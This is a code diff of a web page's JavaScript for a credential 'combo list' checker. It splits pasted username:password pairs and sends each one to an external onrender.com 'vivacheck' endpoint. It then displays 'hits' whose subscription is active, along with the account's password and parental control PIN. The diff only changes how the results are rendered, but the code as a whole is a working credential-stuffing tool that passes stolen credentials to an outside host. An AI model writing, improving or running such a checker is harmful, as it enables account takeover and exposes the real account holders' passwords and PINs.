@@ -4,8 +4,8 @@ document.addEventListener('DOMContentLoaded', function () {
     checkBtn.addEventListener('click', async function () {
         const comboList = document.getElementById('comboList').value;
         const credentials = comboList.split('\n');
-        let hitsOutput = document.getElementById('hitsOutput');
-        //hitsOutput.innerHTML = '';
+        const hitsOutput = document.getElementById('hitsOutput');
+        // hitsOutput.innerHTML = '';
 
         try {
             const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
@@ -16,13 +16,13 @@ document.addEventListener('DOMContentLoaded', function () {
                 console.log(response.data, response.data?.subscriptionStatus.toUpperCase());
                 if (response.data?.subscriptionStatus.toUpperCase() === 'ACTIVE') {
                     hitCount++;
-                    hitsOutput.insertAdjacentHTML('beforeend', `
+                    hitsOutput.innerHTML = `
                         <div class="card mx-auto">
                             <div class="card-body text-center">
                                 ${response.data.emeylpassword} - ${response.data.subscriptionStatus} - ${response.data.parentalControlPin}
                             </div>
                         </div>
-                    `);
+                    `
                 }
             });
 
